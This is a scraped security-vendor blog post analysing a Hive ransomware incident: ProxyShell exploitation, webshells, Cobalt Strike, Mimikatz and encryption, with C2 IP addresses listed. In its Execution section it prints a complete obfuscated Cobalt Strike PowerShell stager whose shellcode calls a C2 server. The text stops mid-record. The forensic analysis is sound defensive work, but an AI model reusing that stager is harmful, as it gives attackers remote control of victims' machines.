{
    "id": "<report_0x3d7d7be4>",
    "url": "https://www.varonis.com/blog/hive-ransomware-analysis",
    "title": "Hive Ransomware Analysis",
    "meta": [
        {
            "id": "<chapter_0x95f58804>",
            "title": "Hive Ransomware Analysis",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x5ce457d9>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x93c8a67a>": "https://info.varonis.com/hubfs/nadav.png"
                    },
                    "text": "",
                    "html": "<img alt=\"Nadav Ovadia\" class=\"blog-post__author-image\" src=\"https://info.varonis.com/hubfs/nadav.png\"/>"
                },
                {
                    "id": "<sentence_0x64695f05>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x2a24b57d>": "https://www.varonis.com/blog/author/nadav-ovadia"
                    },
                    "text": "Nadav Ovadia",
                    "html": "<a href=\"https://www.varonis.com/blog/author/nadav-ovadia\">Nadav Ovadia</a>"
                },
                {
                    "id": "<sentence_0x1d0fd805>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "|",
                    "html": "\n|\n"
                },
                {
                    "id": "<sentence_0xa4f9cceb>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x1c084848>": "https://www.varonis.com//info.varonis.com/hubfs/raw_assets/public/hook-www-varonis/images/clock.svg"
                    },
                    "text": "7 min read",
                    "html": "<p class=\"blog-post__time-read\">\n<img alt=\"Clock for time it takes to read article\" class=\"blog-post__time-read-image\" src=\"//info.varonis.com/hubfs/raw_assets/public/hook-www-varonis/images/clock.svg\"/>\n 7 min read</p>"
                },
                {
                    "id": "<sentence_0xe718c157>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "|",
                    "html": "\n|\n"
                },
                {
                    "id": "<sentence_0x3ef5c30b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Last updated April 19, 2022",
                    "html": "<p class=\"blog-post__last-updated\">Last updated April 19, 2022</p>"
                },
                {
                    "id": "<sentence_0xef5aba4d>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x9e3421b3>": "https://info.varonis.com/hubfs/Blog_HiveRansomware_BlogHero_202204_V1.png"
                    },
                    "text": "",
                    "html": "<img alt=\"Hive Ransomware Analysis\" class=\"blog-post__featured-image\" src=\"https://info.varonis.com/hubfs/Blog_HiveRansomware_BlogHero_202204_V1.png\"/>"
                },
                {
                    "id": "<sentence_0xa2824417>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "During a recent engagement with a customer, the Varonis Forensics Team investigated a ransomware incident. Multiple devices and file servers were compromised and encrypted by a malicious threat group known as Hive.",
                    "html": "<p>During a recent engagement with a customer, the Varonis Forensics Team investigated a ransomware incident. Multiple devices and file servers were compromised and encrypted by a malicious threat group known as Hive.</p>"
                },
                {
                    "id": "<sentence_0x3a4332a1>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xa30d32df>": "https://www.varonis.com/blog/ransomware-as-a-service?hsLang=en"
                    },
                    "text": "First observed in June 2021, Hive is an affiliate-based ransomware variant used by cybercriminals to conduct ransomware attacks against healthcare facilities, nonprofits, retailers, energy providers, and other sectors worldwide. Hive is built for distribution in a Ransomware-as-a-service model that enables affiliates to utilize it as desired.",
                    "html": "<p>First observed in June 2021, Hive is an affiliate-based ransomware variant used by cybercriminals to conduct ransomware attacks against healthcare facilities, nonprofits, retailers, energy providers, and other sectors worldwide. Hive is built for distribution in a <a href=\"https://www.varonis.com/blog/ransomware-as-a-service?hsLang=en\">Ransomware-as-a-service</a> model that enables affiliates to utilize it as desired.</p>"
                },
                {
                    "id": "<sentence_0x7c55aa8>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xa50aeb5c>": "https://info.varonis.com/hs-fs/hubfs/Hive%20Authorization.png?width=436&name=Hive%20Authorization.png"
                    },
                    "text": "",
                    "html": "<img alt=\"Hive Authorization\" src=\"https://info.varonis.com/hs-fs/hubfs/Hive%20Authorization.png?width=436&amp;name=Hive%20Authorization.png\" width=\"436\"/>"
                },
                {
                    "id": "<sentence_0xd334052f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The variant uses common ransomware tactics, techniques, and procedures (TTPs) to compromise victims' devices. While taking live actions, the operator disables anti-malware protections and then exfiltrates sensitive data and encrypts business files. Their affiliates use multiple mechanisms to compromise their victims' networks, including phishing emails with malicious attachments, leaked VPN credentials, and by exploiting vulnerabilities on external-facing assets. In addition, Hive places a plain-text ransom note that threatens to publish the victim's data on the TOR website 'HiveLeaks' unless the victim meets the attacker's conditions.",
                    "html": "<p>The variant uses common ransomware tactics, techniques, and procedures (TTPs) to compromise victims' devices. While taking live actions, the operator disables anti-malware protections and then exfiltrates sensitive data and encrypts business files. Their affiliates use multiple mechanisms to compromise their victims' networks, including phishing emails with malicious attachments, leaked VPN credentials, and by exploiting vulnerabilities on external-facing assets. In addition, Hive places a plain-text ransom note that threatens to publish the victim's data on the TOR website 'HiveLeaks' unless the victim meets the attacker's conditions.</p>"
                }
            ]
        }
    ],
    "chapters": [
        {
            "id": "<chapter_0xd5c1e976>",
            "title": "Hive Ransomware Analysis",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0xbd304376>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xe25d558d>": "https://www.varonis.com/blog",
                        "<a_0x57616006>": "https://www.varonis.com/blog/tag/threat-research"
                    },
                    "text": "Inside Out Security Blog<crlf><crlf><crlf><crlf>/<crlf><crlf><crlf>Threat Research",
                    "html": "<p class=\"blog-post__breadcrumbs\">\n<a href=\"https://www.varonis.com/blog\">Inside Out Security Blog</a>\n \n \n \n /\n \n \n <a class=\"blog-post-tag-link\" href=\"https://www.varonis.com/blog/tag/threat-research\">Threat Research</a>\n</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x6c4a2878>",
            "title": "Observation of the attack",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x339dd043>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The Forensics team observed that the actor managed to achieve its malicious goals and encrypt the environment in less than 72 hours from the initial compromise.",
                    "html": "\nThe Forensics team observed that the actor managed to achieve its malicious goals and encrypt the environment in less than 72 hours from the initial compromise.\n"
                }
            ]
        },
        {
            "id": "<chapter_0xb697189a>",
            "title": "Stage 1: ProxyShell and WebShell",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xe981232b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "First, the attacker exploited multiple Exchange security vulnerabilities, referred to as ProxyShell. Next, the attack placed a malicious backdoor script, referred to as webshell, in a publicly accessible directory on the Exchange server. These web scripts could then execute malicious PowerShell code over the compromised server with SYSTEM privileges.",
                    "html": "\nFirst, the attacker exploited multiple Exchange security vulnerabilities, referred to as ProxyShell. Next, the attack placed a malicious backdoor script, referred to as webshell, in a publicly accessible directory on the Exchange server. These web scripts could then execute malicious PowerShell code over the compromised server with SYSTEM privileges.\n"
                }
            ]
        },
        {
            "id": "<chapter_0x2b9d63ea>",
            "title": "Stage 2: Cobalt Strike",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xbcef00c1>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The malicious PowerShell code downloaded additional stagers from a remote C2 (Command & Control) server associated with the Cobalt Strike framework. The stagers were not written to the file system but executed in memory.",
                    "html": "<p>The malicious PowerShell code downloaded additional stagers from a remote C2 (Command &amp; Control) server associated with the Cobalt Strike framework. The stagers were not written to the file system but executed in memory.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x1f49a33>",
            "title": "Stage 3: Mimikatz and Pass-The-Hash",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x5b2b1ffe>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xbe515e9>": "https://www.varonis.com/blog/what-is-mimikatz?hsLang=en"
                    },
                    "text": "Leveraging the SYSTEM permissions, the threat actor created a new system administrator user named \"user\" and advanced to the credential dumping stage, invoking Mimikatz. By stealing the domain Administrator NTLM hash and without needing to crack the password, the operator managed to reuse it via Pass-The-Hash attack and take control of the domain admin account.",
                    "html": "<p>Leveraging the SYSTEM permissions, the threat actor created a new system administrator user named \"user\" and advanced to the credential dumping stage, invoking <a href=\"https://www.varonis.com/blog/what-is-mimikatz?hsLang=en\">Mimikatz</a>. By stealing the domain Administrator NTLM hash and without needing to crack the password, the operator managed to reuse it via Pass-The-Hash attack and take control of the domain admin account.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xf84f5bac>",
            "title": "Stage 4: Scanning for sensitive information",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xcc11e097>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Next, the threat actor performed extensive discovery activities across the network. In addition to searching for files containing \"password\" in their names, observed activities included dropping network scanners and collecting the networks' IP addresses and device names, followed by RDPs to the backup servers and other critical assets.",
                    "html": "<p>Next, the threat actor performed extensive discovery activities across the network. In addition to searching for files containing \"password\" in their names, observed activities included dropping network scanners and collecting the networks' IP addresses and device names, followed by RDPs to the backup servers and other critical assets.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x96d45a7>",
            "title": "Stage 5: Ransomware deployment",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x83805649>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Finally, a custom-crafted malware payload named Windows.exe was delivered and executed on various devices, leading to wide encryption and denial of access to files within the organization.",
                    "html": "<p>Finally, a custom-crafted malware payload named Windows.exe was delivered and executed on various devices, leading to wide encryption and denial of access to files within the organization.</p>"
                },
                {
                    "id": "<sentence_0x237394f1>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The payload created a plain text ransomware demand note during the encryption phase.",
                    "html": "<p>The payload created a plain text ransomware demand note during the encryption phase.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x1f3a0753>",
            "title": "Initial Access",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xc23f890d>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The initial indicator of compromise was the successful exploitation of Microsoft Exchange via vulnerabilities known as ProxyShell.",
                    "html": "<p>The initial indicator of compromise was the successful exploitation of Microsoft Exchange via vulnerabilities known as ProxyShell.</p>"
                },
                {
                    "id": "<sentence_0x3c58af05>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Revealed in August 2021, ProxyShell is a Remote Code Execution (RCE) vulnerability. ProxyShell involves a set of three separate security flaws and allows remote attackers to execute arbitrary code on affected installations of Microsoft Exchange Server.",
                    "html": "<p>Revealed in August 2021, ProxyShell is a Remote Code Execution (RCE) vulnerability. ProxyShell involves a set of three separate security flaws and allows remote attackers to execute arbitrary code on affected installations of Microsoft Exchange Server.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xf43b05e6>",
            "title": "CVE-2021-34473 (Base Score: 9.8)",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x5e091434>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Microsoft Exchange Server Remote Code Execution Vulnerability.",
                    "html": "<p>Microsoft Exchange Server Remote Code Execution Vulnerability.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xaf0d6506>",
            "title": "CVE-2021-34523 (Base Score: 9.8)",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xf83b4591>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Microsoft Exchange Server Elevation of Privilege Vulnerability",
                    "html": "<p>Microsoft Exchange Server Elevation of Privilege Vulnerability</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xb12ac0ec>",
            "title": "CVE-2021-31207 (Base Score: 7.2)",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x9a7707b9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Microsoft Exchange Server Security Feature Bypass Vulnerability",
                    "html": "<p>Microsoft Exchange Server Security Feature Bypass Vulnerability</p>"
                },
                {
                    "id": "<sentence_0xa328bcd7>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Microsoft released patches for those three vulnerabilities in April and May 2021 as part of their \"Patch Tuesday\" releases. CVE-2021-34473 and CVE-2021-34523 were patched (KB5001779) In April 2021. CVE-2021-31207 was patched (KB5003435) in May.",
                    "html": "<p>Microsoft released patches for those three vulnerabilities in April and May 2021 as part of their \"Patch Tuesday\" releases. CVE-2021-34473 and CVE-2021-34523 were patched (KB5001779) In April 2021. CVE-2021-31207 was patched (KB5003435) in May.</p>"
                },
                {
                    "id": "<sentence_0x6fa1c973>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "During the investigation, we found specific exploitation evidence of these CVEs (Common Vulnerabilities and Exposures), which allowed the adversary to deploy webshells successfully on the compromised server.",
                    "html": "<p>During the investigation, we found specific exploitation evidence of these CVEs (Common Vulnerabilities and Exposures), which allowed the adversary to deploy webshells successfully on the compromised server.</p>"
                },
                {
                    "id": "<sentence_0x1ece6f06>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x9586c1aa>": "https://info.varonis.com/hs-fs/hubfs/ProxyShell%20exploitation.png?width=2162&name=ProxyShell%20exploitation.png"
                    },
                    "text": "",
                    "html": "<p><img alt=\"ProxyShell exploitation\" src=\"https://info.varonis.com/hs-fs/hubfs/ProxyShell%20exploitation.png?width=2162&amp;name=ProxyShell%20exploitation.png\" width=\"2162\"/></p>"
                },
                {
                    "id": "<sentence_0x9ca91519>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Based on our analysis, four different IP addresses accessed the malicious files:",
                    "html": "<p>Based on our analysis, four different IP addresses accessed the malicious files:</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xf890ae12>",
            "title": "139.60.161.228 (USA)",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xdab1f927>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "ASN: HOSTKEY",
                    "html": "<p>ASN: HOSTKEY</p>"
                },
                {
                    "id": "<sentence_0x3706a45e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "RELATED ACTIVITY: Cobalt Strike C2 and Log4j vulnerability scanning",
                    "html": "<p>RELATED ACTIVITY: Cobalt Strike C2 and Log4j vulnerability scanning</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xddfab6fd>",
            "title": "139.60.161.56 (USA)",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x87b519ac>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "ASN: HOSTKEY",
                    "html": "<p>ASN: HOSTKEY</p>"
                },
                {
                    "id": "<sentence_0x43cbb8df>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "RELATED ACTIVITY: Cobalt Strike C2 and Log4j vulnerability scanning",
                    "html": "<p>RELATED ACTIVITY: Cobalt Strike C2 and Log4j vulnerability scanning</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x4791ea7a>",
            "title": "185.70.184.8 (Netherlands)",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x120280e9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "ASN: HOSTKEY",
                    "html": "<p>ASN: HOSTKEY</p>"
                },
                {
                    "id": "<sentence_0x4e9df533>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "RELATED ACTIVITY: Cobalt Strike C2 and Log4j vulnerability scanning. Associated with Emotet, IcedID, and QBot.",
                    "html": "<p>RELATED ACTIVITY: Cobalt Strike C2 and Log4j vulnerability scanning. Associated with Emotet, IcedID, and QBot.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x93c55aed>",
            "title": "91.208.52.149 (Netherlands)",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xe0c1e603>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "ASN: SERVERIUS-A",
                    "html": "<p>ASN: SERVERIUS-A</p>"
                },
                {
                    "id": "<sentence_0x2df99d19>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The following malicious files were spotted:",
                    "html": "<p>The following malicious files were spotted:</p>"
                },
                {
                    "id": "<sentence_0x697faad8>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x63a7a959>": "https://info.varonis.com/hs-fs/hubfs/Webshell%20GET%20requests.png?width=1036&name=Webshell%20GET%20requests.png"
                    },
                    "text": "These file names are made of random characters that do not appear to have any significance. Attackers commonly use this technique to prevent third parties from finding the webshells online by sending HTTP requests to a list of preconstructed names that are part of other campaigns.",
                    "html": "<p><img alt=\"Webshell GET requests\" src=\"https://info.varonis.com/hs-fs/hubfs/Webshell%20GET%20requests.png?width=1036&amp;name=Webshell%20GET%20requests.png\" width=\"1036\"/>These file names are made of random characters that do not appear to have any significance. Attackers commonly use this technique to prevent third parties from finding the webshells online by sending HTTP requests to a list of preconstructed names that are part of other campaigns.</p>"
                },
                {
                    "id": "<sentence_0xf40b22bc>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xf2dc888c>": "https://info.varonis.com/hs-fs/hubfs/whoami%20shell.png?width=433&name=whoami%20shell.png"
                    },
                    "text": "",
                    "html": "<p><img alt=\"whoami shell\" src=\"https://info.varonis.com/hs-fs/hubfs/whoami%20shell.png?width=433&amp;name=whoami%20shell.png\" width=\"433\"/></p>"
                },
                {
                    "id": "<sentence_0xe07e7a0c>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xd2c8c8c6>": "https://github.com/ThePacketBender/webshells"
                    },
                    "text": "The source code of the established webshells is taken from a public git repository at https://github.com/ThePacketBender/webshells.",
                    "html": "<p>The source code of the established webshells is taken from a public git repository at <a href=\"https://github.com/ThePacketBender/webshells\">https://github.com/ThePacketBender/webshells</a>.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x7157e326>",
            "title": "Execution",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x60ee0dc4>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "By establishing a foothold on the compromised Exchange Server, the threat actor executed various PowerShell commands designed to download malicious files from the remote C2 server to the victim's computer. Attackers would execute the malware by using commands such as Invoke-Expression (IEX) or by downloading the file content directly into the device's memory and executing it:",
                    "html": "<p>By establishing a foothold on the compromised Exchange Server, the threat actor executed various PowerShell commands designed to download malicious files from the remote C2 server to the victim's computer. Attackers would execute the malware by using commands such as Invoke-Expression (IEX) or by downloading the file content directly into the device's memory and executing it:</p>"
                },
                {
                    "id": "<sentence_0xdab4b812>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xecc5a350>": "https://info.varonis.com/hs-fs/hubfs/C2%20invoke%20execution.png?width=951&name=C2%20invoke%20execution.png"
                    },
                    "text": "Further, attackers executed an additional obfuscated PowerShell script that was a part of the Cobalt Strike framework:",
                    "html": "<p><img alt=\"C2 invoke execution\" src=\"https://info.varonis.com/hs-fs/hubfs/C2%20invoke%20execution.png?width=951&amp;name=C2%20invoke%20execution.png\" width=\"951\"/>Further, attackers executed an additional obfuscated PowerShell script that was a part of the Cobalt Strike framework:</p>"
                },
                {
                    "id": "<sentence_0xd877d55f>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x4d4a1ff9>": "https://info.varonis.com/hs-fs/hubfs/Powershell%20executed%20command.jpg?width=1430&name=Powershell%20executed%20command.jpg"
                    },
                    "text": "The Base64 encoded command contains several layers of encoding but finally decodes to the following PowerShell command:",
                    "html": "<p><img alt=\"Powershell executed command\" src=\"https://info.varonis.com/hs-fs/hubfs/Powershell%20executed%20command.jpg?width=1430&amp;name=Powershell%20executed%20command.jpg\" width=\"1430\"/>The Base64 encoded command contains several layers of encoding but finally decodes to the following PowerShell command:</p>"
                },
                {
                    "id": "<sentence_0x4ecf7e8e>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x35a9926c>": "\nfunction func_get_proc_address {\n\tParam ($var_module, $var_procedure)\t\t\n\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\n\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\n}\nfunction func_get_delegate_type {\n\tParam (\n\t\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n\t\t[Parameter(Position = 1)] [Type] $var_return_type = [Void]\n\t)\n\t$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\t$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\t$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\treturn $var_type_builder.CreateType()\n}\n[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDBpbdHcjt/oD/JWHd4sCLmyO98yFY4rSkNpnTutksFjPk1iId3VatKb1qXZnUlBHxy9uRECX2FYx1tCT2QCAktdtYyitbmqWDvjVGRB9bSN2UEZRDmJERk1XGQNuTFlKT09CDBcNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDFQ0SGAN3UUpHRk1XDBYNEwouKSPHnhscH1J2ehVV9xiGIbRbaqS5cqjAmVwq68rbHTbqKwvVPYdIwQX2sCpP4Huf69SBXmMT5Uf78YpcuINAFMaQSn2ghpZ2G7UnqTkvRtIxy6TiOP3eK6FQ1llgA3N8VNacREpvDLUIaZ6/oaEPfm0YlN8JZlys9JSvydexNohj88pn9o2SyWlVIxY8cJLweQz1ZdO2JIzPEnVW4x52BGHMgFqryhE8N1PEyfVnFL/7oUr8aGQvMsusR84zVxpx5+C6a+SP9iBhlQcdopF5Zu0hJsRfacn4nFrojL1nt+/oBQcjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BIQGg0VEw0SFRINEREbIzpKg64=')\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n\t$var_code[$x] = $var_code[$x] -bxor 35\n}\nWrite-Output $var_code\n"
                    },
                    "text": "",
                    "html": "<code>\nfunction func_get_proc_address {\n\tParam ($var_module, $var_procedure)\t\t\n\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\n\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\n}\nfunction func_get_delegate_type {\n\tParam (\n\t\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n\t\t[Parameter(Position = 1)] [Type] $var_return_type = [Void]\n\t)\n\t$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\t$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\t$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\treturn $var_type_builder.CreateType()\n}\n[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDBpbdHcjt/oD/JWHd4sCLmyO98yFY4rSkNpnTutksFjPk1iId3VatKb1qXZnUlBHxy9uRECX2FYx1tCT2QCAktdtYyitbmqWDvjVGRB9bSN2UEZRDmJERk1XGQNuTFlKT09CDBcNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDFQ0SGAN3UUpHRk1XDBYNEwouKSPHnhscH1J2ehVV9xiGIbRbaqS5cqjAmVwq68rbHTbqKwvVPYdIwQX2sCpP4Huf69SBXmMT5Uf78YpcuINAFMaQSn2ghpZ2G7UnqTkvRtIxy6TiOP3eK6FQ1llgA3N8VNacREpvDLUIaZ6/oaEPfm0YlN8JZlys9JSvydexNohj88pn9o2SyWlVIxY8cJLweQz1ZdO2JIzPEnVW4x52BGHMgFqryhE8N1PEyfVnFL/7oUr8aGQvMsusR84zVxpx5+C6a+SP9iBhlQcdopF5Zu0hJsRfacn4nFrojL1nt+/oBQcjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BIQGg0VEw0SFRINEREbIzpKg64=')\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n\t$var_code[$x] = $var_code[$x] -bxor 35\n}\nWrite-Output $var_code\n</code>"
                },
                {
                    "id": "<sentence_0xc2ce27a9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The additional \"for loop\" function adds another layer of obfuscation and XORs the Base64 code with a key of 35. We successfully extracted the IP address of the target C2 by mimicking the process, which, unsurprisingly, turned out to be the same address we found previously.",
                    "html": "<p>The additional \"for loop\" function adds another layer of obfuscation and XORs the Base64 code with a key of 35. We successfully extracted the IP address of the target C2 by mimicking the process, which, unsurprisingly, turned out to be the same address we found previously.</p>"
                },
                {
                    "id": "<sentence_0xfe7bfe36>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xd34823ab>": "https://info.varonis.com/hs-fs/hubfs/Cobalt%20Payload%20C2.png?width=1726&name=Cobalt%20Payload%20C2.png"
                    },
                    "text": "",
                    "html": "<p><img alt=\"Cobalt Payload C2\" src=\"https://info.varonis.com/hs-fs/hubfs/Cobalt%20Payload%20C2.png?width=1726&amp;name=Cobalt%20Payload%20C2.png\" width=\"1726\"/></p>"
                },
                {
                    "id": "<sentence_0x533ee63e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Converting the Base64 into a hexadecimal string and reformatting with a Python script restored the malicious file. VirusTotal analysis shows 23 out of 52 antivirus detections and attributes the file to the Cobalt Strike framework.",
